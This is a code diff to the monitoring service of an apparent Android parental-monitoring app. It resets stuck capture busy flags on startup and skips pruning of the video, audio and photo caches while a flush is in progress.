@@ -186,6 +186,15 @@ class MonitoringService : Service() {
             return
         }
         startForegroundImmediate()
+        // Reset busy flags on startup - they may be stuck true from a previous crash
+        try {
+            ringBusy.set(false)
+            recordBusy.set(false)
+            smsBusy.set(false)
+            cameraBusy.set(false)
+            capturing.set(false)
+        } catch (_: Exception) {
+        }
         try {
             com.redeye.parentalmonitor.utils.Background.runCritical {
                 try {
@@ -5651,6 +5660,7 @@ private suspend fun ringDevice(seconds: Int) {
     }
 
     private fun pruneVideoCache(maxKept: Int) {
+        if (videoFlushBusy.get()) return
         try {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4") && !file.name.endsWith(".sent")
@@ -5715,6 +5725,7 @@ private suspend fun ringDevice(seconds: Int) {
     }
 
     private fun pruneAudioCache(maxKept: Int) {
+        if (audioFlushBusy.get()) return
         try {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a") && !file.name.endsWith(".sent")
@@ -6027,6 +6038,8 @@ private suspend fun ringDevice(seconds: Int) {
         }
     }
     private fun prunePhotoCache(maxKept: Int = 10) {
+        // Don't prune while flush is in progress - race condition with .sent rename
+        if (photoFlushBusy.get()) return
         try {
             try {
                 cacheDir.listFiles { file ->
